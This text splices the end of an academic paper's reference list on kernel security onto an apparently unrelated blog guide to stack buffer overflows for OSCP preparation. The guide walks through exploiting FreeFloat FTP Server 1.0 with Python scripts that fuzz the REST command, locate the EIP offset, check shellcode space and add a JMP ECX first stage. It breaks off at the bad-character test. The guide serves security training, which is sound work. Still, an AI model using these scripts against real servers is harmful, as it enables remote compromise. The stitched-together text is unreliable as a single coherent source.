Tech. rep., Linux Foundation,\nSeptember 2013.\n[33] DING, Y., WEI, T., WANG, T., LIANG, Z., AND ZOU, W. Heap\nTaichi: Exploiting Memory Allocation Granularity in Heap-\nSpraying Attacks. In Proc. of ACSAC (2010), pp. 327\u2013336.\n[34] DISTROWATCH. Put the fun back into computing. Use Linux,\nBSD., November 2013. http:\/\/distrowatch.com.\n[35] EDGE, J. Kernel address space layout randomization, October\n2013. http:\/\/lwn.net\/Articles\/569635\/.\n[36] EXPLOIT DATABASE. EBD-131, December 2003.\n[37] EXPLOIT DATABASE. EBD-16835, September 2009.\n[38] EXPLOIT DATABASE. EBD-14814, August 2010.\n[39] EXPLOIT DATABASE. EBD-15150, September 2010.\n[40] EXPLOIT DATABASE. EBD-15285, October 2010.\n[41] EXPLOIT DATABASE. EBD-15916, January 2011.\n[42] EXPLOIT DATABASE. EBD-17391, June 2011.\n[43] EXPLOIT DATABASE. EBD-17787, September 2011.\n[44] EXPLOIT DATABASE. EBD-20201, August 2012.\n[45] EXPLOIT DATABASE. EBD-24555, February 2013.\n[46] GEORGE, V., PIAZZA, T., AND JIANG, H. Technology In-\nsight: Intel c Next Generation Microarchitecture Codename Ivy\nBridge, September 2011. http:\/\/www.intel.com\/idf\/\nlibrary\/pdf\/sf_2011\/SF11_SPCS005_101F.pdf.\n[47] GOOGLE. Android, November 2013. http:\/\/www.\nandroid.com.\n[48] GOOGLE. Chromium OS, November 2013. http:\/\/www.\nchromium.org\/chromium-os.\n[49] HARDY, N. The Confused Deputy: (or why capabilities might\nhave been invented). SIGOPS Oper. Syst. Rev. 22 (October 1988),\n36\u201338.\n[50] HERDER, J. N., BOS, H., GRAS, B., HOMBURG, P., AND\nTANENBAUM, A. S. MINIX 3: A Highly Reliable, Self-\n\fRepairing Operating System. SIGOPS Oper. Syst. Rev. 40, 3 (July\n2006), 80\u201389.\n[51] HUND, R., HOLZ, T., AND FREILING, F. C. Return-Oriented\nRootkits: Bypassing Kernel Code Integrity Protection Mecha-\nnisms. In Proc. of USENIX Sec (2009), pp. 384\u2013398.\n[52] HUNT, G. C., AND LARUS, J. R. Singularity: Rethinking the\nSoftware Stack. SIGOPS Oper. Syst. Rev. 41, 2 (April 2007), 37\u2013\n49.\n[53] INGO MOLNAR. 4G\/4G split on x86, 64 GB RAM (and\nmore) support, July 2003. http:\/\/lwn.net\/Articles\/\n39283\/.\n[54] INTEL R\n64 AND IA-32 ARCHITECTURES SOFTWARE DEVEL-\nOPER\u2019S MANUAL. Instruction Set Extensions Programming Ref-\nerence. Tech. rep., Intel Corporation, January 2013.\n[55] INTEL R\n64 AND IA-32 ARCHITECTURES SOFTWARE DEVEL-\nOPER\u2019S MANUAL. System Programming Guide, Part 1. Tech.\nrep., Intel Corporation, September 2013.\n[56] JANA, S., AND SHMATIKOV, V. Memento: Learning Secrets\nfrom Process Footprints. In Proc. of IEEE S&P (2012), pp. 143\u2013\n157.\n[57] KEMERLIS, V. P., PORTOKALIDIS, G., AND KEROMYTIS,\nA. D. kGuard: Lightweight Kernel Protection against Return-\nto-user Attacks. In Proc. of USENIX Sec (2012), pp. 459\u2013474.\n[58] KILLIAN, T. J. Processes as Files. In Proc. of USENIX Summer\n(1984), pp. 203\u2013207.\n[59] KING, R. Kernel Memory Layout on ARM Linux,\nNovember 2005. https:\/\/www.kernel.org\/doc\/\nDocumentation\/arm\/memory.txt.\n[60] KLEEN, A. Memory Layout on amd64 Linux, July 2004.\nhttps:\/\/www.kernel.org\/doc\/Documentation\/\nx86\/x86_64\/mm.txt.\n[61] KNOWLTON, K. C. A fast storage allocator. Commun. ACM 8,\n10 (October 1965), 623\u2013624.\n[62] KOLDINGER, E. J., CHASE, J. S., AND EGGERS, S. J. Archi-\ntecture Support for Single Address Space Operating Systems. In\nProc. of ASPLOS (1992), pp. 175\u2013186.\n[63] KURMUS, A., TARTLER, R., DORNEANU, D., HEINLOTH,\nB., ROTHBERG, V., RUPRECHT, A., SCHR\u00d6DER-PREIKSCHAT,\nW., LOHMANN, D., AND KAPITZA, R. Attack Surface Metrics\nand Automated Compile-Time OS Kernel Tailoring. In Proc. of\nNDSS (2013).\n[64] LAMETER, C. Generic Virtual Memmap support for\nSPARSEMEM v3, April 2007. http:\/\/lwn.net\/\nArticles\/229670\/.\n[65] LIAKH, S. NX protection for kernel data, July 2009. http:\/\/\nlwn.net\/Articles\/342266\/.\n[66] LIEDTKE, J. On \u00b5-Kernel Construction. In Proc. of SOSP\n(1984), pp. 237\u2013250.\n[67] LOVE, R. Linux Kernel Development, 2nd ed. 2005, ch. Memory\nManagement, pp. 181\u2013208.\n[68] MARINAS, C. arm64: Distinguish between user and kernel XN\nbits, November 2012. http:\/\/permalink.gmane.org\/\ngmane.linux.kernel.commits.head\/348605.\n[69] MARINAS, C. Memory Layout on AArch64 Linux,\nFebruary 2012. https:\/\/www.kernel.org\/doc\/\nDocumentation\/arm64\/memory.txt.\n[70] MCDOUGALL, R., AND MAURO, J. Solaris Internals, 2nd ed.\n2006, ch. File System Framework, pp. 710\u2013710.\n[71] MOKB. Broadcom Wireless Driver Probe Response SSID Over-\nflow, November 2006.\n[72] MOZILLA. Firefox OS, November 2013. https:\/\/www.\nmozilla.org\/en-US\/firefox\/os\/.\n[73] NATIONAL VULNERABILITY DATABASE. Kernel Vulnerabili-\nties, November 2013. http:\/\/goo.gl\/GJpw0b.\n[74] NILS AND JON. Polishing Chrome for Fun and Profit, August\n2013. http:\/\/goo.gl\/b5hmjj.\n[75] OFFENSIVE SECURITY. The Exploit Database, November 2013.\nhttp:\/\/www.exploit-db.com.\n[76] ORMANDY, T., AND TINNES, J. Linux ASLR Curiosities. In\nCanSecWest (2009).\n[77] PAX. Homepage of The PaX Team, November 2013. http:\/\/\npax.grsecurity.net.\n[78] PAX TEAM. UDEREF\/i386, April 2007. http:\/\/\ngrsecurity.net\/~spender\/uderef.txt.\n[79] PAX TEAM. UDEREF\/amd64, April 2010. http:\/\/\ngrsecurity.net\/pipermail\/grsecurity\/2010-\nApril\/001024.html.\n[80] PAX TEAM. Better kernels with GCC plugins, October 2011.\nhttp:\/\/lwn.net\/Articles\/461811\/.\n[81] PERLA, E., AND OLDANI, M. A Guide To Kernel Exploitation:\nAttacking the Core. 2010, ch. Stairway to Successful Kernel Ex-\nploitation, pp. 47\u201399.\n[82] PTS. Phoronix Test Suite, February 2014. http:\/\/www.\nphoronix-test-suite.com.\n[83] RAMON DE CARVALHO VALLE & PACKET STORM.\nsock_sendpage() NULL pointer dereference\n(PPC\/PPC64 exploit), September 2009. http:\/\/\npacketstormsecurity.org\/files\/81212\/Linux-\nsock_sendpage-NULL-Pointer-Dereference.\nhtml.\n[84] RIZZO, L. Netmap: A Novel Framework for Fast Packet I\/O. In\nProc. of USENIX ATC (2012), pp. 101\u2013112.\n[85] ROSENBERG, D. Owned Over Amateur Radio: Remote Kernel\nExploitation in 2011. In Proc. of DEF CON R\n(2011).\n[86] SECURITYFOCUS. Linux Kernel \u2019perf_counter_open()\u2019 Local\nBuffer Overflow Vulnerability, September 2009.\n[87] SHACHAM, H. The geometry of innocent flesh on the bone:\nReturn-into-libc without function calls (on the x86). In Proc. of\nCCS (2007), pp. 552\u201361.\n[88] SINAN EREN. Smashing The Kernel Stack For Fun And Profit.\nPhrack 6, 60 (December 2002).\n[89] SPENGLER, B. Enlightenment Linux Kernel Exploitation\nFramework, July 2013. https:\/\/grsecurity.net\/\n~spender\/exploits\/enlightenment.tgz.\n[90] SPENGLER, B. Recent ARM security improvements,\nFebruary 2013. https:\/\/forums.grsecurity.net\/\nviewtopic.php?f=7&t=3292.\n[91] SQRKKYU, AND TWZI. Attacking the Core: Kernel Exploiting\nNotes. Phrack 6, 64 (May 2007).\n[92] VAN DE VEN, A. Debug option to write-protect ro-\ndata: the write protect logic and config option, Novem-\nber 2005. http:\/\/lkml.indiana.edu\/hypermail\/\nlinux\/kernel\/0511.0\/2165.html.\n[93] VAN DE VEN, A. Add -fstack-protector support\nto the kernel, July 2006. http:\/\/lwn.net\/Articles\/\n193307\/.\n[94] VAN DE VEN, A. x86: add code to dump the (kernel) page ta-\nbles for visual inspection, February 2008. http:\/\/lwn.net\/\nArticles\/267837\/.\n[95] YU, F. Enable\/Disable Supervisor Mode Execution Protection,\nMay 2011. http:\/\/git.kernel.org\/?p=linux\/\nkernel\/git\/torvalds\/linux-2.6.git;a=commit;\nh=de5397ad5b9ad22e2401c4dacdf1bb3b19c05679.\n\f"}
{"text":"#[1]Steflan's Security Blog \u00bb Feed [2]Steflan's Security Blog \u00bb\nComments Feed [3]Steflan's Security Blog \u00bb Complete Guide to Stack\nBuffer Overflow (OSCP Preparation) Comments Feed [4]alternate\n[5]alternate [6]alternate\n* [7]Home\n* [8]CTF Walkthroughs\n+ [9]Hack The Box\n+ [10]TryHackMe\n+ [11]VulnHub\n* [12]Guides\n+ [13]Enumeration\n+ [14]Privilege Escalation\no [15]Linux\no [16]Windows\n+ [17]Web\n+ [18]Buffer Overflow\no [19]Stack Buffer Overflow\n* [20]Reviews\n+ [21]Certifications\n+ [22]Training Labs\n+ [23]Learning Material\n* [24]Resources\n+ [25]Cheat Sheets\n+ [26]Checklists\n* [27]About\n____________________ Search\n[28]Steflan\u2019s Security Blog Steflan\u2019s Security Blog\n*\n[29]Buffer Overflow, [30]Guides, [31]Stack Buffer Overflow\nComplete Guide to Stack Buffer Overflow (OSCP Preparation)\nFebruary 10, 2021 | by Stefano Lanaro | [32]12 Comments\nIntroduction\nStack buffer overflow is a memory corruption vulnerability that occurs\nwhen a program writes more data to a buffer located on the stack than\nwhat is actually allocated for that buffer, therefore overflowing to a\nmemory address that is outside of the intended data structure.\nThis will often cause the program to crash, and if certain conditions\nare met, it could allow an attacker to gain remote control of the\nmachine with privileges as high as the user running the program, by\nredirecting the flow execution of the application to malicious code.\nThe purpose of this guide is to teach the basics of stack buffer\noverflow, especially for students preparing for the OSCP certification\nexam.\nTable of Contents [33]hide\n[34]1 Introduction\n[35]2 Stack Buffer Overflow Theory\n[36]2.1 Memory\n[37]2.2 The Stack\n[38]2.3 CPU Registers\n[39]2.4 Pointers\n[40]2.5 Common Instructions\n[41]3 Stack Buffer Overflow Process\n[42]4 Practical Example\n[43]4.1 Crashing the application\n[44]4.2 Identifying the EIP offset\n[45]4.3 Finding Available Shellcode Space\n[46]4.3.1 What if there isn\u2019t enough space?\n[47]4.4 Testing for Bad Characters\n[48]4.5 Finding a JMP ESP Return Address\n[49]4.6 Generating and Adding Shellcode\n[50]4.7 Gaining Remote Access\n[51]5 Other Buffer Overflow Examples\n[52]6 Conclusion\n[53]7 Sources & Useful Links\nStack Buffer Overflow Theory\nBefore diving into an actual attack, it is crucial to understand basic\nconcepts of C programming such as memory, the stack, CPU registers,\npointers and what happens behind the scenes, in order to take advantage\nof a memory corruption to compromise a system.\nMemory\nSource:\n[54]https:\/\/gabrieletolomei.wordpress.com\/miscellanea\/operating-systems\n\/in-memory-layout\/\nNormally, a process is allocated a certain amount of memory which\ncontains all of the necessary information it requires to run, such as\nthe code itself and any DLLs, which isn\u2019t shared with other processes.\nWhenever an executable is run, its code is loaded into memory so that\nit can perform all the tasks that is has been programmed to do, because\nall of the instructions are loaded onto the program\u2019s memory, this can\nbe changed thus making the application perform unintended actions.\nAll variables in memory are stored using either little endian (for\nintel x86 processors) or big endian (for PowerPC) format.\nIn little endian, the bytes are stored in reverse order. So for\nexample:\n* 0x032CFBE8 will be stored as \u201cE8FB2C03\u201d\n* 0x7734BC0D will be stored as \u201c0DBC3477\u201d\n* 0x0BADF00D will be stored as \u201c0DF0AD0B\u201d\nThis will come useful when redirecting the application execution as the\nJMP ESP instruction address will have to be stored in reverse in the\nexploit.\nThe Stack\nThe stack is a section of memory that stores temporary data, that is\nexecuted when a function is called.\nThe stack always grows downwards towards lower values as new\ninformation is added to it. The ESP CPU register points to the lowest\npart of the stack and anything below it is free memory that can be\noverwritten, which is why it is often exploited by injecting malicious\ncode into it.\nCPU Registers\nRegisters are CPU variables that sore single records, there are a fixed\nnumber of registers that are used for different purposes and they all\nhave a specific location in the CPU.\nRegisters can hold pointers which point to memory addresses containing\ncertain instructions for the program to perform, this can be exploited\nby using a jump instruction to move to a different memory location\ncontaining malicious code.\nIntel assembly has 8 general purpose and 2 special purpose 32-bit\nregister. Different compilers may have different uses for the\nregisters, the ones listed below are used in Microsoft\u2019s compiler:\nRegister Type Purpose\nEAX General Purpose Stores the return value of a function.\nEBX General Purpose No specific uses, often set to a commonly used\nvalue in a function to speed up calculations.\nECX General Purpose Occasionally used as a function parameter and often\nused as a loop counter.\nEDX General Purpose Occasionally used as a function parameter, also\nused for storing short-term variables in a function.\nESI General Purpose Used as a pointer, points to the source of\ninstructions that require a source and destination.\nEDI General Purpose Often used as a pointer. Points to the destination\nof instructions that require a source and destination.\nEBP General Purpose Has two uses depending on compile settings, it is\neither the frame pointer or a general purpose register for storing of\ndata used in calculations.\nESP General Purpose A special register that stores a pointer to the top\nof the stack (virtually under the end of the stack).\nEIP Special Purpose Stores a pointer to the address of the instruction\nthat the program is currently executing.\nAfter each instruction, a value equal to the its size is added to EIP,\nmeaning it points at the machine code for the next instruction.\nFLAGS Special Purpose Stores meta-information about the results of\nprevious operations i.e. whether it overflowed the register or whether\nthe operands were equal.\nPointers\nA pointer is, a variable that stores a memory address as its value,\nwhich will correspond to a certain instruction the program will have to\nperform. The value of the memory address can be obtained by\n\u201cdereferencing\u201d the pointer.\nThey are used in buffer overflow attacks to redirect the execution flow\nto malicious code through a pointer that points at a JMP instruction.\nCommon Instructions\nThis section covers some of the most common assembly instructions ,\ntheir purpose in a program and some example uses:\nInstruction Type Description Example Instructions\nPointers and Dereferencing Since registers simply store values, they\nmay or may not be used as pointers, depending on on the information\nstored.\nIf being used as a pointer, registers can be dereferenced, retrieving\nthe value stored at the address being pointed to. movq,movb\nDoing Nothing The NOP instruction, short for \u201cno operation\u201d, simply\ndoes nothing. NOP\nMoving Data Around Used to move values and pointers. mov, movsx,\nmovzx,lea\nMath and Logic Used for math and logic. Some are simple arithmetic\noperations and some are complex calculations. add, sub,inc, dec, and\nJumping Around Used mainly to perform jumps to certain memory locations\n, it stores the address to jump to. jmp,call, ret,cmp, test\nManipulating the Stack Used for adding and removing data from the\nstack. push, pop,pushaw\nSome of these instructions are used during the practical example in\norder to gain remote access to the victim machine.\nStack Buffer Overflow Process\nAlthough applications require a custom exploit to be crafted in order\nto gain remote access, most stack buffer overflow exploitation, at a\nhigh level, involve the following phases:\n* [55]Fuzzing the Application to Replicate the Crash\n* [56]Finding & Testing the EIP Offset\n* [57]Finding Shellcode Space\n* [58]Testing for Bad Characters\n* [59]Finding & Testing a JMP ESP Instruction Address\n* [60]Generating & Adding Shellcode & NOP Slides to the Script\n* [61]Gaining Remote Access\nIFRAME: [62]about:blank\nIFRAME:\n[63]https:\/\/docs.google.com\/presentation\/d\/e\/2PACX-1vTvxdWupo9Os-NOkD_j\nkff-yj9-tUdXUDv6bpBg2EaYxTh5OKIYqgLq9wsgwsPEG6e6dHe8zvnUutuO\/embed?star\nt=false&loop=false&delayms=3000\nThe next section will cover these phases in great detail, from both a\ntheoretical and practical standpoint.\nPractical Example\nThis practical example will demonstrate how to exploit a stack buffer\noverflow vulnerability that affected FreeFloat FTP Server 1.0, an FTP\nserver application. According to the exploit\u2019s author, the crash occurs\nwhen sending the following information to the server:\n* USER + [arbitrary username]\n* PASS + [arbitrary password]\n* REST (used to restart a file transfer from a specified point) +\n300+ bytes\nThe entire exploitation process will be conducted using Immunity\nDebugger, which is free.\nA copy of the vulnerable executable along with the proof of concept\nexploit (in the form of a Metasploit module) can be found at [64]this\nExploit DB page.\nWindows Defender may need to be disabled if using an external host to\ndebug the application, as by default it does not allow incoming\nconnections.\nCrashing the application\nFirst of all we have to cause the application to crash, in order to\nascertain there is a buffer overflow vulnerability and this can be\nfurther exploited to gain remote access.\nOnce the FreeFloat FTP Server executable has been downloaded, it can be\nrun by double-clicking it:\nThis will start the FTP server and open port 21 for incoming\nconnections.\nStarting the Immunity Debugger, selecting the File \u2192 Attach option to\nattach it to the FreeFloat FTP process:\nAlternatively, the \u201cOpen\u201d option can also be used to select an\nexecutable:\nOnce the debugger has been attached to the process, it will enter a\npause state. In order to start its execution, the Debug \u2192 Run option\ncan be used:\nAlternatively, pressing F9 will achieve the same result:\nImmunity Debugger uses the following panes used to display information:\n* Top-Left Pane \u2013 It contains the instruction offset, the original\napplication code, its assembly instruction and comments added by\nthe debugger.\n* Bottom-Left Pane -It contains the hex dump of the application\nitself.\n* Top-Right Pane \u2013 It contains the CPU registers and their current\nvalue.\n* Bottom-Right Pane \u2013 It contains the Memory stack contents.\nPython can be used to generate a buffer of 300 A characters to test the\ncrash:\nEstablishing a TCP connecting with port 21 using Netcat, logging in\nwith test\/test and sending REST plus the buffer created using Python to\ncause the crash:\nThis has crashed the program and Immunity Debugger has reported an\naccess violation error:\nThe EIP register was overwritten with the 300 x41 (which corresponds to\nA in ASCII) sent through Netcat:\nSince EIP stores the next instruction to be executed by the application\nand we established we can manipulate its value, this can be exploited\nby redirecting the flow of the program execution to ESP, which can be\ninjected with malicious code.\nThe fuzzing process can also automated through the use of a Python\nfuzzer, by sending incremental amounts of data in order to identify\nexactly at which point the application will crash and therefore stop\nresponding.\nBelow is an example Python fuzzer for the FreeFloat FTP application:\nimport errno\nfrom os import strerror\nfrom socket import *\nimport sys\nfrom time import sleep\nfrom struct import pack\nsize = 100 #defining an initial buffer size\nwhile(size < 500): #using a while loop to keep sending the buffer until it reach\nes 500 bytes\ntry:\nprint \"\\nSending evil buffer with %s bytes\" % size\nbuffer =\"A\" * size #defining the buffer as a bunch of As\ns = socket(AF_INET,SOCK_STREAM)\ns.connect((\"10.0.0.101\",21)) #establishing connection\ns.recv(2000)\ns.send(\"USER test\\r\\n\") #sending username\ns.recv(2000)\ns.send(\"PASS test\\r\\n\") #sending password\ns.recv(2000)\ns.send(\"REST \"+ buffer +\"\\r\\n\") #sending rest and buffer\ns.close() #closing the connection\ns = socket(AF_INET,SOCK_STREAM)\ns.connect((\"10.0.0.101\",21)) #an additional connection is needed for the\ncrash to occur\nsleep(1) #waiting one second\ns.close() #closing the connection\nsize +=100 #increasing the buffer size by 100\nsleep(10) #waiting 10 seconds before repeating the loop\nexcept: #if a connection can't be made, print an error and exit cleanly\nprint \"[*]Error in connection with server\"\nsys.exit()\nTo connect to the application in a similar fashion to the test done\nthrough Netcat, the following script can be used:\nimport errno\nfrom os import strerror\nfrom socket import *\nimport sys\nfrom time import sleep\nfrom struct import pack\ntry:\nprint \"\\n[+] Sending evil buffer...\"\nbuffer =\"A\" * 300 #defining the buffer as a bunch of As\ns = socket(AF_INET,SOCK_STREAM)\ns.connect((\"10.0.0.101\",21)) #establishing connection\ns.recv(2000)\ns.send(\"USER test\\r\\n\") #sending username\ns.recv(2000)\ns.send(\"PASS test\\r\\n\") #sending password\ns.recv(2000)\ns.send(\"REST \"+ buffer +\"\\r\\n\") #sending rest and buffer\ns.close()\ns = socket(AF_INET,SOCK_STREAM)\ns.connect((\"10.0.0.101\",21)) #an additional connection is needed for the\ncrash to occur\nsleep(1) #waiting one second\ns.close() #closing the connection\nprint \"\\n[+] Sending buffer of \" + str(len(buffer)) + \" bytes...\"\nprint \"\\n[+] Sending buffer: \" + buffer\nprint \"\\n[+] Done!\"\nexcept: #if a connection can't be made, print an error and exit cleanly\nprint \"[*]Error in connection with server\"\nsys.exit()\nIdentifying the EIP offset\nThe next step required is to identify which part of the buffer that is\nbeing sent is landing in the EIP register, in order to then modify it\nto control the execution flow of the program. Because all that was sent\nwas a bunch of As, at the moment there is no way to know what part has\noverwritten EIP.\nThe Metasploit msf-pattern_create tool can be used to create a randomly\ngenerated string that will be replacing the A characters in order to\nidentify which part lands in EIP:\nmsf-pattern_create -l [pattern length]\nCreating a pattern of 300 characters using msf-pattern_create to keep\nthe same buffer length:\nAdding the pattern to the buffer variable in the script, instead of\nsending the \u201cA\u201d characters:\nimport errno\nfrom os import strerror\nfrom socket import *\nimport sys\nfrom time import sleep\nfrom struct import pack\ntry:\nprint \"\\n[+] Sending evil buffer...\"\nbuffer = \"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac\n0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6A\ne7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3\nAh4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9\"\n#defining the buffer as a random pattern\ns = socket(AF_INET,SOCK_STREAM)\ns.connect((\"10.0.0.101\",21)) #establishing connection\ns.recv(2000)\ns.send(\"USER test\\r\\n\") #sending username\ns.recv(2000)\ns.send(\"PASS test\\r\\n\") #sending password\ns.recv(2000)\ns.send(\"REST \"+ buffer +\"\\r\\n\") #sending rest and buffer\ns.close()\ns = socket(AF_INET,SOCK_STREAM)\ns.connect((\"10.0.0.101\",21)) #an additional connection is needed for the\ncrash to occur\nsleep(1) #waiting one second\ns.close() #closing the connection\nprint \"\\n[+] Sending buffer of \" + str(len(buffer)) + \" bytes...\"\nprint \"\\n[+] Sending buffer: \" + buffer\nprint \"\\n[+] Done!\"\nexcept: #if a connection can't be made, print an error and exit cleanly\nprint \"[*]Error in connection with server\"\nsys.exit()\nRestarting the application, re-attaching Immunity Debugger and running\nthe script:\nThe randomly generated pattern was sent instead of the A characters.\nThe application crashed with an access violation error as expected, but\nthis time, the EIP register was overwritten with \u201c41326941\u201d\nThe Metasploit msf-pattern_offset tool can then be used to find the EIP\nvalue in the pattern created earlier to calculate the exact EIP offset\ni.e. the exact location of EIP, which in this case is at byte 246.\nmsf-pattern_offset -l [pattern length] -q [EIP address]\nThe following Mona command can also be used to perform this step:\n!mona findmsp -distance [pattern length]\nModifying the script to override EIP with four \u201cB\u201d characters instead\nof the As in order to verify whether the last test was successful:\nimport errno\nfrom os import strerror\nfrom socket import *\nimport sys\nfrom time import sleep\nfrom struct import pack\ntry:\nprint \"\\n[+] Sending evil buffer...\"\noffset = \"A\" * 246 #defining the offset value\nEIP = \"B\" * 4 #EIP placeholder\npadding = \"C\" * (300 - len(offset) - len(EIP)) #adding padding to keep t\nhe same buffer size of 300 bytes\nbuffer = offset + EIP + padding #assembling the buffer\ns = socket(AF_INET,SOCK_STREAM)\ns.connect((\"10.0.0.101\",21)) #establishing connection\ns.recv(2000)\ns.send(\"USER test\\r\\n\") #sending username\ns.recv(2000)\ns.send(\"PASS test\\r\\n\") #sending password\ns.recv(2000)\ns.send(\"REST \"+ buffer +\"\\r\\n\") #sending rest and buffer\ns.close()\ns = socket(AF_INET,SOCK_STREAM)\ns.connect((\"10.0.0.101\",21)) #an additional connection is needed for the\ncrash to occur\nsleep(1) #waiting one second\ns.close() #closing the connection\nprint \"\\n[+] Sending buffer of \" + str(len(buffer)) + \" bytes...\"\nprint \"\\n[+] Sending buffer: \" + buffer\nprint \"\\n[+] Done!\"\nexcept: #if a connection can't be made, print an error and exit cleanly\nprint \"[*]Error in connection with server\"\nsys.exit()\nRestarting the application, re-attaching Immunity Debugger and running\nthe script:\nAs expected, the EIP registry was overwritten with the four \u201cB\u201d\ncharacters:\nNow that we have full control over EIP, it can be exploited to change\nredirect the application execution to certain instructions.\nFinding Available Shellcode Space\nThe purpose of this step is to find a suitable location in the memory\nfor our shellcode to then redirect the program execution to it.\nWhen the last script was executed, the C characters that were used to\nkeep the buffer size as 300 overflowed into ESP, so this could be a\ngood place to insert the shellcode:\nWe can tell the C characters sent to the application landed in ESP from\nthe fifth one onward because ESP\u2019s address is 0064FBE8, which\ncorresponds to the second group of Cs\nWe now have to verify whether there is enough space for the shellcode\ninside ESP, which is what will be executed by the system by the program\nin order to gain remote access.\nA normal reverse shell payload is normally about 300-400 bytes, and\nbecause only 50 Cs were sent we cannot tell whether there is enough\nspace for it in ESP.\nModifying the script, adding about 550 C characters to the script in a\nnew shellcode variable:\nimport errno\nfrom os import strerror\nfrom socket import *\nimport sys\nfrom time import sleep\nfrom struct import pack\ntry:\nprint \"\\n[+] Sending evil buffer...\"\noffset = \"A\" * 246 #defining the offset value\nEIP = \"B\" * 4 #EIP placeholder\nshellcode = \"C\" * (800 - (len(offset) -len(EIP))) #Shellcode placeholder\nusing about 550 Cs\nbuffer = offset + EIP + shellcode #assembling the buffer\ns = socket(AF_INET,SOCK_STREAM)\ns.connect((\"10.0.0.101\",21)) #establishing connection\ns.recv(2000)\ns.send(\"USER test\\r\\n\") #sending username\ns.recv(2000)\ns.send(\"PASS test\\r\\n\") #sending password\ns.recv(2000)\ns.send(\"REST \"+ buffer +\"\\r\\n\") #sending rest and buffer\ns.close()\ns = socket(AF_INET,SOCK_STREAM)\ns.connect((\"10.0.0.101\",21)) #an additional connection is needed for the\ncrash to occur\nsleep(1) #waiting one second\ns.close() #closing the connection\nprint \"\\n[+] Sending buffer of \" + str(len(buffer)) + \" bytes...\"\nprint \"\\n[+] Sending buffer: \" + buffer\nprint \"\\n[+] Done!\"\nexcept: #if a connection can't be made, print an error and exit cleanly\nprint \"[*]Error in connection with server\"\nsys.exit()\nRestarting the application, re-attaching Immunity Debugger and running\nthe script:\nAll the \u201cC\u201d characters that were sent by the script have overwritten\nESP:\nTo calculate how many C characters made it into ESP, all we need to do\nis subtract the address where ESP starts to the one where the Cs end.\nBeginning of ESP:\nEnd of the Cs:\nCalculating the difference between the two memory addresses using\nPython, all of the C characters made it into ESP which makes it a\nsuitable shellcode location.\nWhat if there isn\u2019t enough space?\nIf there isn\u2019t enough space in the ESP register to insert our\nshellcode, this can be circumvented by using a first stage payload.\nSince we should be able to override at least the first few characters\nof ESP, this will be enough to instruct it to jump to a different\nregister where the shellcode will be placed.\nIf a different register points to the beginner of the buffer, for\nexample ECX:\nThen the opcode used to perform a JMP ECX instruction can be generated:\nAnd added to the script, in order to instruct ESP to jump to ECX:\nimport errno\nfrom os import strerror\nfrom socket import *\nimport sys\nfrom time import sleep\nfrom struct import pack\ntry:\nprint \"\\n[+] Sending evil buffer...\"\noffset = \"A\" * 246 #defining the offset value\nEIP = \"B\" * 4 #EIP placeholder\nfirst_stage = \"\\xff\\xe1\" #defining first stage payload as the JMP ECX in\nstruction\nshellcode = \"C\" * (800 - (len(offset) -len(EIP))) #Shellcode placeholder\nusing about 550 Cs\nbuffer = shellcode + offset + EIP + first_stage #assembling the buffer\ns = socket(AF_INET,SOCK_STREAM)\ns.connect((\"10.0.0.101\",21)) #establishing connection\ns.recv(2000)\ns.send(\"USER test\\r\\n\") #sending username\ns.recv(2000)\ns.send(\"PASS test\\r\\n\") #sending password\ns.recv(2000)\ns.send(\"REST \"+ buffer +\"\\r\\n\") #sending rest and buffer\ns.close()\ns = socket(AF_INET,SOCK_STREAM)\ns.connect((\"10.0.0.101\",21)) #an additional connection is needed for the\ncrash to occur\nsleep(1) #waiting one second\ns.close() #closing the connection\nprint \"\\n[+] Sending buffer of \" + str(len(buffer)) + \" bytes...\"\nprint \"\\n[+] Sending buffer: \" + buffer\nprint \"\\n[+] Done!\"\nexcept: #if a connection can't be made, print an error and exit cleanly\nprint \"[*]Error in connection with server\"\nsys.exit()\nIn this scenario, the shellcode is added to the beginning of the\nbuffer, since the register where it is placed is the first one that our\ndata is written to.\nSo basically this is what happens when the exploit is run:\n1. The shellcode is written to ECX\n2. The buffer causes the application to crash\n3. EIP is overwritten with a JMP ESP instruction which redirects the\nexecution flow to ESP\n4. ESP performs a JMP ECX instruction, redirecting the execution to\nECX\n5. The shellcode stored in ECX is then executed\nTesting for Bad Characters\nSome programs will often consider certain characters as \u201cbad\u201d, and all\nthat means is that if they come across one of them, this will cause a\ncorruption of the rest of the data contained in the instruction sent to\nthe application, not allowing the program to properly interpret the it.\nOne character that is pretty much always considered bad is x00, as it\nis a null-byte and terminates the rest of the application code.\nIn this phase all we have to do is identify whether there are any bad\ncharacters, so that we can later on remove them from the shellcode.\nModifying the script, adding all possible characters in hex format to a\nbadchars variable and sending it instead of the shellcode placeholder:\nimport errno\nfrom os import strerror\nfrom socket import *\nimport sys\nfrom time import sleep\nfrom struct import pack\ntry:\nprint \"\\n[+] Sending evil buffer...\"\noffset = \"A\" * 246 #defining the offset value\nEIP = \"B\" * 4 #EIP placeholder\nbadchars = 